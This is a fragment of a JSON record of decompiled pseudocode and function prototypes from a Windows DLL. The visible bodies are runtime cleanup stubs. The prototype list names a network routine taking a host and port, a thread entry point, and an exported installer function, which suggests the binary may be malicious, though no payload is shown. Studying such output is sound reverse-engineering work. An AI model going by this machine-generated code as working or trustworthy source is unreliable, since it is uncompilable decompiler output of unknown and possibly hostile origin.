    "__int64 __fastcall sub_180037338(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // rdx",
    "  char v3; // cl",
    "  int v4; // ecx",
    "",
    "  v2 = *(_QWORD *)(a2 + 176) + *(int *)(**(_QWORD **)(a2 + 176) + 4LL);",
    "  v3 = 4;",
    "  if ( *(_QWORD *)(v2 + 72) )",
    "    v3 = 0;",
    "  v4 = *(_BYTE *)(v2 + 16) & 0x13 | 4 | v3 & 0x17;",
    "  *(_DWORD *)(v2 + 16) = v4;",
    "  if ( (v4 & *(_DWORD *)(v2 + 20)) != 0 )",
    "    throw;",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800373DC(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // rdx",
    "  char v3; // cl",
    "  int v4; // ecx",
    "",
    "  v2 = *(_QWORD *)(a2 + 64) + *(int *)(**(_QWORD **)(a2 + 64) + 4LL);",
    "  v3 = 4;",
    "  if ( *(_QWORD *)(v2 + 72) )",
    "    v3 = 0;",
    "  v4 = *(_BYTE *)(v2 + 16) & 0x13 | 4 | v3 & 0x17;",
    "  *(_DWORD *)(v2 + 16) = v4;",
    "  if ( (v4 & *(_DWORD *)(v2 + 20)) != 0 )",
    "    throw;",
    "  return 0;",
    "}",
    "",
    "",
    "void sub_1800374A0()",
    "{",
    "  sub_1800116E0();",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18003752C(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = *(_DWORD *)(a2 + 240) & 1;",
    "  if ( (_DWORD)result )",
    "  {",
    "    *(_DWORD *)(a2 + 240) &= ~1u;",
    "    return sub_1800019F0(a2 + 32);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void sub_180037570()",
    "{",
    "  sub_1800116E0();",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180037618(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // rdx",
    "  char v3; // cl",
    "  int v4; // ecx",
    "",
    "  v2 = *(_QWORD *)(a2 + 144) + *(int *)(**(_QWORD **)(a2 + 144) + 4LL);",
    "  v3 = 4;",
    "  if ( *(_QWORD *)(v2 + 72) )",
    "    v3 = 0;",
    "  v4 = *(_BYTE *)(v2 + 16) & 0x13 | 4 | v3 & 0x17;",
    "  *(_DWORD *)(v2 + 16) = v4;",
    "  if ( (v4 & *(_DWORD *)(v2 + 20)) != 0 )",
    "    throw;",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18003768C(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // rdx",
    "  char v3; // cl",
    "  int v4; // ecx",
    "",
    "  v2 = *(_QWORD *)(a2 + 176) + *(int *)(**(_QWORD **)(a2 + 176) + 4LL);",
    "  v3 = 4;",
    "  if ( *(_QWORD *)(v2 + 72) )",
    "    v3 = 0;",
    "  v4 = *(_BYTE *)(v2 + 16) & 0x13 | 4 | v3 & 0x17;",
    "  *(_DWORD *)(v2 + 16) = v4;",
    "  if ( (v4 & *(_DWORD *)(v2 + 20)) != 0 )",
    "    throw;",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180037708(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // rdx",
    "  char v3; // cl",
    "  int v4; // ecx",
    "",
    "  v2 = *(_QWORD *)(a2 + 48) + *(int *)(**(_QWORD **)(a2 + 48) + 4LL);",
    "  v3 = 4;",
    "  if ( *(_QWORD *)(v2 + 72) )",
    "    v3 = 0;",
    "  v4 = *(_BYTE *)(v2 + 16) & 0x13 | 4 | v3 & 0x17;",
    "  *(_DWORD *)(v2 + 16) = v4;",
    "  if ( (v4 & *(_DWORD *)(v2 + 20)) != 0 )",
    "    throw;",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180037788(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v2; // rdx",
    "  char v3; // cl",
    "  int v4; // ecx",
    "",
    "  v2 = *(_QWORD *)(a2 + 160) + *(int *)(**(_QWORD **)(a2 + 160) + 4LL);",
    "  v3 = 4;",
    "  if ( *(_QWORD *)(v2 + 72) )",
    "    v3 = 0;",
    "  v4 = *(_BYTE *)(v2 + 16) & 0x13 | 4 | v3 & 0x17;",
    "  *(_DWORD *)(v2 + 16) = v4;",
    "  if ( (v4 & *(_DWORD *)(v2 + 20)) != 0 )",
    "    throw;",
    "  return 0;",
    "}",
    "",
    "",
    "void __fastcall  sub_1800377F0(__int64 a1, __int64 a2)",
    "{",
    "  __int64 v3; // rcx",
    "",
    "  sub_18000ACE0(*(__int64 **)(a2 + 32), *(__int64 **)(a2 + 64));",
    "  sub_180009130(v3, *(_QWORD *)(a2 + 48), *(_QWORD *)(a2 + 56));",
    "  throw;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180037894(__int64 a1, __int64 a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = *(_DWORD *)(a2 + 72) & 1;",
    "  if ( (_DWORD)result )",
    "  {",
    "    *(_DWORD *)(a2 + 72) &= ~1u;",
    "    return sub_180006BD0((_QWORD *)(*(_QWORD *)(a2 + 48) + 16LL));",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180037E0B(__int64 a1, __int64 a2)",
    "{",
    "  if ( !*(_QWORD *)(a2 + 32) )",
    "    sub_18002A800(*(_QWORD *)(a2 + 64));",
    "  return sub_18001747C(*(_QWORD *)(a2 + 64));",
    "}",
    "",
    "",
    "void sub_180037F95()",
    "{",
    "  sub_180020A3C(5);",
    "}",
    "",
    "",
    "void __fastcall sub_180037FC7(__int64 a1, __int64 a2)",
    "{",
    "  int *v2; // r9",
    "",
    "  if ( *(_DWORD *)(a2 + 64) )",
    "  {",
    "    if ( *(_DWORD *)(a2 + 68) )",
    "    {",
    "      v2 = *(int **)(a2 + 128);",
    "      *(_BYTE *)(qword_18004D870[(__int64)*v2 >> 6] + 72LL * (*v2 & 0x3F) + 56) &= ~1u;",
    "    }",
    "    sub_18002E2A4(**(_DWORD **)(a2 + 128));",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_180038060()",
    "{",
    "  sub_18000FCAC();",
    "}",
    "",
    "",
    "void sub_18003806C()",
    "{",
    "  __int64 v0; // rcx",
    "  void (__fastcall ***v1)(_QWORD, __int64); // rax",
    "",
    "  while ( qword_18004C6E8 )",
    "  {",
    "    v0 = *(_QWORD *)(qword_18004C6E8 + 8);",
    "    qword_18004C6E8 = *(_QWORD *)qword_18004C6E8;",
    "    v1 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + 16LL))(v0);",
    "    if ( v1 )",
    "      (**v1)(v1, 1);",
    "    sub_1800116E0();",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_1800380C8()",
    "{",
    "  void (__fastcall ***v0)(_QWORD, __int64); // rax",
    "",
    "  if ( qword_18004C6D8 )",
    "  {",
    "    v0 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)qword_18004C6D8 + 16LL))(qword_18004C6D8);",
    "    if ( v0 )",
    "      (**v0)(v0, 1);",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_180038108()",
    "{",
    "  *(__int64 *)((char *)&qword_18004C7A0 + *(int *)(qword_18004C7A0 + 4)) = (__int64)&off_18003A540;",
    "  *(_DWORD *)((char *)&qword_18004C7A0 + *(int *)(qword_18004C7A0 + 4) - 4) = *(_DWORD *)(qword_18004C7A0 + 4) - 16;",
    "  qword_18004C7B0 = (__int64)&off_18003A520;",
    "  sub_1800108D0((__int64)&qword_18004C7B0);",
    "}",
    "",
    "",
    "void __fastcall sub_18003815C()",
    "{",
    "  sub_180005CB0((__int64)&qword_18004C810);",
    "}",
    "",
    "",
    "void __fastcall sub_180038168()",
    "{",
    "  sub_18000FCAC();",
    "}",
    "",
    "",
    "void __fastcall sub_180038174()",
    "{",
    "  *(__int64 *)((char *)&qword_18004C8C0 + *(int *)(qword_18004C8C0 + 4)) = (__int64)&off_18003A540;",
    "  *(_DWORD *)((char *)&qword_18004C8C0 + *(int *)(qword_18004C8C0 + 4) - 4) = *(_DWORD *)(qword_18004C8C0 + 4) - 16;",
    "  qword_18004C8D0 = (__int64)&off_18003A520;",
    "  sub_1800108D0((__int64)&qword_18004C8D0);",
    "}",
    "",
    "",
    "void __fastcall sub_1800381C8()",
    "{",
    "  sub_180005CB0((__int64)&qword_18004C930);",
    "}",
    "",
    "",
    "void __fastcall sub_1800381D4()",
    "{",
    "  sub_18000FCAC();",
    "}",
    "",
    "",
    "void __fastcall sub_1800381E0()",
    "{",
    "  void *v0; // rcx",
    "  void (*v1)(void); // rax",
    "",
    "  while ( (unsigned __int64)qword_18004B060 < 0xA )",
    "  {",
    "    v0 = (void *)qword_18004CA20[qword_18004B060++];",
    "    v1 = (void (*)(void))DecodePointer(v0);",
    "    if ( v1 )",
    "      v1();",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_180038220()",
    "{",
    "  sub_18000FCAC();",
    "}",
    "",
    ""
  ],
  "h_code": [
    "#include <windows.h>",
    "#include <stdint.h>",
    "#include <stdio.h>",
    "",
    "#include \"defs.h\"",
    "",
    "void JUMPOUT(int a) {",
    "}",
    "",
    "unsigned int _bss_start__ = 0;",
    "unsigned int __cxa_finalize = 0;",
    "int sub_180001000();",
    "int sub_180001038();",
    "int sub_180001068();",
    "int sub_1800010F0();",
    "int sub_180001110();",
    "int sub_180001140();",
    "int sub_1800011D8();",
    "int sub_1800011F8();",
    "__int64 sub_180001240(int a1, ...);",
    "__int64 sub_1800012A0(int a1, int a2, int a3, ...);",
    "__int64 __fastcall sub_180001300(__int64 a1, __int64 a2);",
    "_QWORD *__fastcall sub_180001360(_QWORD *a1, char a2);",
    "void  Concurrency::cancel_current_task(void);",
    "__int64 __fastcall sub_180001420(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180001460(__int64 a1, __int64 a2);",
    "void  std::vector<void *>::_Xlen();",
    "__int64 __fastcall sub_1800014C0(__int64 a1, __int64 a2);",
    "bool __fastcall sub_180001510(__int64 a1, unsigned int a2, __int64 a3);",
    "__int64 __fastcall sub_180001590(__int64 a1, __m128i *a2, __int64 a3);",
    "_QWORD *__fastcall sub_180001770(_QWORD *a1, char a2);",
    "__int64 __fastcall sub_1800017C0(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180001820(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180001880(__int64 a1, __int64 a2, unsigned int a3);",
    "__int64 __fastcall sub_180001900(__int64 a1, char a2);",
    "void  Concurrency::cancel_current_task(void);",
    "__int64 __fastcall sub_180001980(__int64 a1, __int64 a2);",
    "_QWORD *__fastcall sub_1800019C0(_QWORD *a1, char a2);",
    "__int64 __fastcall sub_1800019F0(__int64 a1);",
    "void __fastcall sub_180001AC0(__int64 a1);",
    "__int64 __fastcall sub_180001B00(__int64 *a1, __int64 a2);",
    "_BYTE *__fastcall sub_180001CA0(__int64 a1, _BYTE *a2, _BYTE *a3);",
    "_BYTE *__fastcall sub_180001D00(__int64 a1, _BYTE *a2, _BYTE *a3);",
    "__int64 __fastcall std::ctype<char>::do_widen(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall std::ctype<char>::do_narrow(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);",
    "__int64 __fastcall sub_180001DA0(__int64 a1, __int64 a2);",
    "_QWORD *__fastcall sub_180001E10(_QWORD *a1, __int64 a2, __m128i *a3);",
    "__int64 __fastcall sub_180001ED0(__int64 a1, __int64 a2);",
    "_QWORD *__fastcall sub_180001F30(_QWORD *a1, char a2);",
    "PCONTEXT __fastcall StartAddress(XSAVE_FORMAT *lpThreadParameter);",
    "__int64 *__fastcall sub_1800021A0(__int64 *a1);",
    "__int64 sub_180002280();",
    "__int64 __fastcall sub_180003250(_QWORD *a1);",
    "void __fastcall sub_1800032E0(char *a1, INTERNET_PORT a2);",
    "__int64 __fastcall sub_180003520(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180003780(_QWORD *a1);",
    "__int64 *__fastcall sub_180003870(__int64 *a1, _QWORD *a2);",
    "__int64 __fastcall sub_180003A40(_QWORD *a1, __int64 a2);",
    "__int64 __fastcall sub_180003D70(_QWORD *a1);",
    "__int64 __fastcall sub_180003E10(__int64 a1, _QWORD *a2);",
    "__int64 __fastcall sub_180004160(__int64 *a1);",
    "void sub_1800041C0();",
    "PCONTEXT __fastcall sub_180004F60(XSAVE_FORMAT *lpThreadParameter);",
    "UINT __stdcall  MsiSetExternalUIRecord(",
    "        INSTALLUI_HANDLER_RECORD puiHandler,",
    "        DWORD dwMessageFilter,",
    "        LPVOID pvContext,",
    "        PINSTALLUI_HANDLER_RECORD ppuiPrevHandler);",
    "__int64 __fastcall sub_180004FD0(__int64 a1, int a2);",
    "__int64 __fastcall sub_180005010(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180005040(_QWORD *a1);",
    "__int64 __fastcall sub_180005090(__int64 a1, __int64 a2, __int64 a3);",
    "_QWORD *__fastcall sub_1800051C0(__int64 a1, _QWORD *a2, _QWORD *a3);",
    "_QWORD *__fastcall sub_1800052A0(__int64 a1, _QWORD *a2, __int64 a3, unsigned int a4);",
    "__int64 __fastcall sub_1800053B0(__int64 a1, unsigned __int8 *a2, __int64 a3);",
    "unsigned __int64 __fastcall sub_1800054F0(__int64 a1, _BYTE *a2, __int64 a3);",
    "__int64 __fastcall sub_1800056A0(__int64 a1);",
    "__int64 __fastcall sub_180005970(__int64 a1);",
    "__int64 __fastcall sub_1800059E0(__int64 a1, unsigned int a2);",
    "__int64 __fastcall sub_180005AD0(__int64 a1, unsigned int a2);",
    "void **__fastcall sub_180005CB0(__int64 a1);",
    "__int64 __fastcall sub_180005D60(__int64 *a1);",
    "__int64 *__fastcall sub_180005E50(__int64 *a1, __int64 a2, __int64 a3, __int64 a4);",
    "unsigned __int64 *__fastcall sub_180006190(__int64 a1, unsigned __int64 *a2, _QWORD *a3, char a4);",
    "_QWORD *__fastcall sub_1800062C0(__int64 a1, _QWORD *a2, __int64 a3, int a4, char a5);",
    "__int64 __fastcall sub_180006450(__int64 a1);",
    "__int64 __fastcall sub_180006530(__int64 a1, unsigned int a2);",
    "void **__fastcall sub_180006730(__int64 a1);",
    "__int64 __fastcall sub_180006870(_QWORD **a1, unsigned __int8 *a2, __int64 a3);",
    "__int64 __fastcall sub_180006930(_QWORD **a1, _BYTE *a2, __int64 a3);",
    "__int64 __fastcall sub_1800069F0(__int64 a1);",
    "void **__fastcall sub_180006A40(_QWORD *a1);",
    "__int64 __fastcall sub_180006AA0(__int64 a1, _QWORD *a2);",
    "__int64 __fastcall sub_180006BD0(_QWORD *a1);",
    "__int64 __fastcall sub_180006BF0(__int64 *a1);",
    "__int64 __fastcall sub_180006C20(__int64 a1, unsigned __int64 a2, char a3);",
    "__int64 __fastcall sub_180006D30(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180006E50(__int64 a1, char a2);",
    "__int64 __fastcall sub_180006E90(__int64 a1, char a2);",
    "__int64 __fastcall sub_180006ED0(__int64 a1, char a2);",
    "_QWORD *__fastcall sub_180006F10(_QWORD *a1, char a2);",
    "_QWORD *__fastcall sub_180006FC0(_QWORD *a1, char a2);",
    "__int64 __fastcall sub_180007030(__int64 a1, char a2);",
    "_QWORD *__fastcall sub_180007070(_QWORD *a1, char a2);",
    "_QWORD *__fastcall sub_1800070F0(_QWORD *a1, char a2);",
    "_QWORD *__fastcall sub_1800071A0(_QWORD *a1, char a2);",
    "_QWORD *__fastcall sub_180007210(_QWORD *a1, char a2);",
    "__int64 __fastcall sub_180007250(int a1, __int64 a2, __int128 *a3, int a4, char a5, __int64 a6);",
    "__int64 __fastcall sub_1800072F0(int a1, __int64 a2, __int128 *a3, __int64 a4, char a5, unsigned __int64 a6);",
    "__int64 __fastcall sub_1800075F0(int a1, __int64 a2, __int128 *a3, __int64 a4, char a5, unsigned __int64 a6);",
    "__int64 __fastcall sub_1800078F0(int a1, __int64 a2, __int128 *a3, __int64 a4, char a5, __int64 a6);",
    "__int64 __fastcall sub_180007A00(int a1, __int64 a2, __int128 *a3, __int64 a4, char a5, __int64 a6);",
    "__int64 __fastcall sub_180007B10(int a1, __int64 a2, __int128 *a3, __int64 a4, char a5, unsigned int a6);",
    "__int64 __fastcall sub_180007C10(int a1, __int64 a2, __int128 *a3, __int64 a4, char a5, unsigned int a6);",
    "_OWORD *__fastcall sub_180007D10(__int64 a1, _OWORD *a2, __int128 *a3, __int64 a4, unsigned __int8 a5, char a6);",
    "__int64 __fastcall sub_180008040(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180008120(__int64 a1, __int64 a2);",
    "bool __fastcall sub_1800081A0(__int64 a1);",
    "__int64 __fastcall sub_180008290(__int64 a1, __int64 a2, int a3);",
    "__int64 __fastcall sub_180008390(__int64 a1);",
    "__int64 __fastcall sub_180008490(__int64 a1, __int64 a2);",
    "_QWORD *__fastcall sub_180008790(_QWORD *a1, __int64 a2);",
    "__int64 __fastcall sub_180008910(_QWORD *a1, __int64 a2, unsigned __int64 a3);",
    "_QWORD *__fastcall sub_1800089A0(_QWORD *a1, char a2);",
    "__int64 __fastcall sub_1800089D0(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180008A10(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_180008A50(__int64 a1, __int64 a2);",
    "_OWORD *__fastcall sub_180008AB0(",
    "        __int64 a1,",
    "        _OWORD *a2,",
    "        __int128 *a3,",
    "        __int64 a4,",
    "        unsigned __int8 a5,",
    "        _BYTE *a6,",
    "        unsigned __int64 a7);",
    "__int64 __fastcall sub_180009100(__int64 **a1);",
    "__int64 __fastcall sub_180009130(__int64 a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_180009180(__int64 a1);",
    "__int64 __fastcall sub_1800092E0(__int64 *a1);",
    "void __fastcall sub_180009390(__int64 a1, __int64 a2, unsigned __int64 a3, int a4);",
    "__int64 __fastcall sub_1800094E0(__int64 a1);",
    "__int64 __fastcall sub_1800095C0(__int64 a1, __int64 a2, char a3);",
    "unsigned __int64 *__fastcall sub_180009720(unsigned __int64 *a1, __int64 a2, unsigned __int64 a3);",
    "_QWORD *__fastcall sub_180009880(_QWORD *a1, char a2);",
    "void __fastcall  std::vector<void *>::_Xlen(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_180009900(__int64 a1);",
    "__int64 __fastcall sub_180009A40(__int64 a1, int a2);",
    "__int64 *__fastcall sub_180009C20(__int64 *a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_180009ED0(__int64 a1);",
    "__int64 __fastcall sub_180009F60(__int64 a1);",
    "__int64 __fastcall sub_18000A0A0(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18000A3D0(unsigned __int64 *a1, __int64 a2, unsigned __int64 a3);",
    "_OWORD *sub_18000A4D0(",
    "        _DWORD a1,",
    "        _OWORD *a2,",
    "        __int128 *a3,",
    "        __int64 a4,",
    "        unsigned __int8 a5,",
    "        _BYTE *a6,",
    "        unsigned __int64 a7,",
    "        char a8,",
    "        ...);",
    "__int64 __fastcall sub_18000ABA0(__int64 a1);",
    "__int64 __fastcall sub_18000ACE0(__int64 *a1, __int64 *a2);",
    "unsigned __int64 *__fastcall sub_18000AD70(unsigned __int64 *a1, unsigned __int64 a2, __int64 a3, char a4);",
    "unsigned __int64 *__fastcall sub_18000AEE0(",
    "        unsigned __int64 *a1,",
    "        unsigned __int64 a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5);",
    "unsigned __int64 *__fastcall sub_18000B070(",
    "        unsigned __int64 *a1,",
    "        unsigned __int64 a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        char a6);",
    "unsigned __int64 *__fastcall sub_18000B230(unsigned __int64 *a1, unsigned __int64 a2, __int64 a3, __int64 a4, char a5);",
    "__int64 __fastcall sub_18000B3D0(__int64 **a1);",
    "_OWORD *__fastcall sub_18000B400(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, _QWORD *a7);",
    "_OWORD *__fastcall sub_18000B540(",
    "        __int64 a1,",
    "        _OWORD *a2,",
    "        __int128 *a3,",
    "        __int128 *a4,",
    "        __int64 a5,",
    "        _DWORD *a6,",
    "        double *a7);",
    "_OWORD *__fastcall sub_18000B690(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, double *a7);",
    "_OWORD *__fastcall sub_18000B7D0(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, float *a7);",
    "_OWORD *__fastcall sub_18000B910(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, _QWORD *a7);",
    "_OWORD *__fastcall sub_18000BA40(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, _QWORD *a7);",
    "_OWORD *__fastcall sub_18000BB70(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, _DWORD *a7);",
    "_OWORD *__fastcall sub_18000BCA0(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, _DWORD *a7);",
    "_OWORD *__fastcall sub_18000BDD0(",
    "        __int64 a1,",
    "        _OWORD *a2,",
    "        __int128 *a3,",
    "        __int128 *a4,",
    "        __int64 a5,",
    "        _DWORD *a6,",
    "        _DWORD *a7);",
    "_OWORD *__fastcall sub_18000BF10(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, _WORD *a7);",
    "_OWORD *__fastcall sub_18000C080(__int64 a1, _OWORD *a2, _OWORD *a3, __int64 a4, __int64 a5, _DWORD *a6, bool *a7);",
    "__int64 __fastcall sub_18000C3B0(__int64 *a1, __int64 a2);",
    "__int64 __fastcall sub_18000C5F0(__int64 *a1, __int64 a2);",
    "__int64 __fastcall sub_18000C770(__int64 *a1, __int64 a2);",
    "__int64 *__fastcall sub_18000C8F0(__int64 *a1, unsigned __int8 a2, __int64 a3, __int64 a4);",
    "bool __fastcall sub_18000CAA0(__int64 a1, char a2);",
    "__int64 __fastcall sub_18000CD60(int **a1);",
    "__int64 __fastcall sub_18000CE10(_QWORD *a1);",
    "__int64 __fastcall sub_18000CE50(__int64 a1, unsigned __int64 *a2, unsigned __int8 a3);",
    "__int64 *__fastcall sub_18000D0A0(__int64 *a1, _BYTE *a2, unsigned __int64 a3);",
    "__int64 __fastcall sub_18000D360(__int64 a1, _QWORD *a2, __int64 a3);",
    "__int64 __fastcall sub_18000D640(char *a1, __int64 *a2, __int64 a3, __int16 a4, __int64 a5);",
    "char __fastcall sub_18000E050(__int64 *a1, __int64 *a2);",
    "__int64 __fastcall sub_18000E120(_BYTE *a1, int a2, __int64 a3, __int64 *a4, __int64 a5);",
    "__int64 __fastcall sub_18000F560(__int64 *a1, __int64 *a2, unsigned __int64 a3, _BYTE *a4, char a5);",
    "unsigned __int64 *__fastcall sub_18000F8D0(",
    "        unsigned __int64 *a1,",
    "        unsigned __int64 a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        __int64 a6);",
    "__int64 __fastcall sub_18000FA50(__int64 *a1, __int64 a2);",
    "void  std::vector<void *>::_Xlen();",
    "__int64 __fastcall sub_18000FC2C(__int64 a1);",
    "int *__fastcall sub_18000FC70(int *a1, int a2);",
    "int *sub_18000FCAC();",
    "void __fastcall sub_18000FCE8(int *a1);",
    "__int64 __fastcall sub_18000FD3C(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18000FD78(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18000FDC0(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18000FDFC(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18000FE44(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18000FE80(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18000FEBC(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_18000FF04(__int64 a1, __int64 a2);",
    "void  Concurrency::cancel_current_task(void);",
    "void __fastcall  sub_18000FF6C(__int64 a1);",
    "void __fastcall  sub_18000FF90(__int64 a1);",
    "void __fastcall  sub_18000FFB4(__int64 a1);",
    "void __fastcall  sub_18000FFD8(__int64 a1);",
    "const char *__fastcall sub_18000FFFC(int a1);",
    "__int64 __fastcall sub_180010024(__int64 a1, char a2);",
    "__int64 *__fastcall sub_1800100AC(__int64 *a1, _BYTE *a2);",
    "_QWORD *__fastcall sub_180010124(_QWORD *a1, char a2);",
    "_QWORD *__fastcall sub_180010180(__int64 a1);",
    "__int64 sub_1800101B8();",
    "__int64 __fastcall sub_1800101C0(char a1);",
    "void __fastcall sub_1800102B4(__int64 a1);",
    "__int64 *__fastcall sub_180010330(__int64 a1, _BYTE *a2);",
    "void __fastcall std::_Locinfo::_Locinfo_dtor(struct std::_Locinfo *a1);",
    "__int64 __fastcall sub_1800103B8(char a1);",
    "void __fastcall std::locale::_Setgloballocale(__int64 a1);",
    "void __fastcall sub_18001041C(__int64 *a1);",
    "void sub_180010458();",
    "__int64 __fastcall sub_18001048C(__int64 a1);",
    "__int64 __fastcall sub_18001054C(__int64 a1, int *a2, __int64 a3);",
    "__int64 __fastcall sub_180010680(__int64 a1);",
    "__int64 __fastcall sub_180010718(__int64 a1, int *a2, __int64 a3);",
    "void __fastcall sub_18001085C(__int64 a1);",
    "__int64 __fastcall sub_1800108D0(__int64 a1);",
    "__int64 __fastcall sub_180010948(__int64 a1);",
    "LARGE_INTEGER sub_1800109C8();",
    "LARGE_INTEGER sub_1800109E4();",
    "__int64 __fastcall sub_180010A10(__int64 a1, __int64 a2, char a3, int a4);",
    "// attributes: thunk",
    "__int64 __fastcall sub_180010AB0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall sub_180010AB8(__int64 a1, int a2);",
    "unsigned __int64 __fastcall sub_180010B70(char *a1, char **a2, unsigned int a3, _DWORD *a4);",
    "unsigned __int64 __fastcall sub_180010D54(char *a1, char **a2, unsigned int a3, _DWORD *a4);",
    "__int64 __fastcall sub_180010E54(char *a1, char **a2, unsigned int a3, _DWORD *a4);",
    "__int64 __fastcall sub_180011030(char *a1, char **a2, unsigned int a3, _DWORD *a4);",
    "// attributes: thunk",
    "void __stdcall Sleep(DWORD dwMilliseconds);",
    "const __m128i *__fastcall sub_180011120(const __m128i *a1, const __m128i *a2, char a3);",
    "__int64 __fastcall sub_1800111F0(__m128i *_RCX, __m128i *a2);",
    "// attributes: thunk",
    "void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);",
    "BOOL __fastcall Mtxinit(struct _RTL_CRITICAL_SECTION *a1);",
    "// attributes: thunk",
    "void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);",
    "// attributes: thunk",
    "void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);",
    "PVOID __fastcall sub_180011308(void *a1);",
    "__int64 __fastcall sub_180011344(",
    "        LPCWSTR lpLocaleName,",
    "        DWORD dwMapFlags,",
    "        LPCCH lpMultiByteStr,",
    "        int a4,",
    "        WCHAR *lpDestStr,",
    "        int cchDest,",
    "        __int64 CodePage,",
    "        int a8);",
    "__int64 sub_180011640();",
    "// attributes: thunk",
    "void __fastcall sub_1800116E0();",
    "_QWORD *__fastcall sub_1800116E8(_QWORD *a1, char a2);",
    "__int64 __fastcall sub_180011714(__int64 a1);",
    "__int64 __fastcall sub_180011750(__int64 a1, int a2, __int64 a3);",
    "__int64 __fastcall sub_1800117A0(__int64 a1, __int64 a2);",
    "__int64 __fastcall sub_1800118B8(char a1);",
    "__int64 __fastcall sub_180011938(__int64 a1, int a2, __int64 a3);",
    "BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);",
    "char sub_180011AA0();",
    "char sub_180011ADC();",
    "bool sub_180011B10();",
    "char __fastcall sub_180011B28(#96 *a1);",
    "char sub_180011B50();",
    "void __fastcall sub_180011B68(",
    "        __int64 a1,",
    "        int a2,",
    "        __int64 a3,",
    "        void (__fastcall *a4)(__int64, _QWORD, __int64),",
    "        int a5,",
    "        __int64 a6);",
    "void sub_180011BC8();",
    "__int64 sub_180011BF8();",
    "char __fastcall sub_180011C0C(int a1);",
    "char __fastcall sub_180011C48(unsigned int a1);",
    "bool __fastcall sub_180011CD4(__int64 a1);",
    "char __fastcall sub_180011D6C(char a1);",
    "char __fastcall sub_180011D90(char a1, char a2);",
    "__int64 __fastcall sub_180011DBC(__int64 a1);",
    "int __cdecl atexit(void (__cdecl *a1)());",
    "__int64 __fastcall _GSHandlerCheck(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 __fastcall _GSHandlerCheckCommon(__int64 a1, __int64 a2);",
    "__int64 __fastcall _GSHandlerCheck_EH4(__int64 a1, __int64 a2, __int64 a3, __int64 a4);",
    "__int64 sub_180011F0C();",
    "unsigned __int64 __fastcall _alloca_probe();",
    "BOOL __fastcall _raise_securityfailure(struct _EXCEPTION_POINTERS *ExceptionInfo);",
    "void __cdecl  _report_gsfailure(uintptr_t StackCookie);",
    "__int64 sub_180012348();",
    "BOOL __fastcall _report_securityfailure(unsigned int a1);",
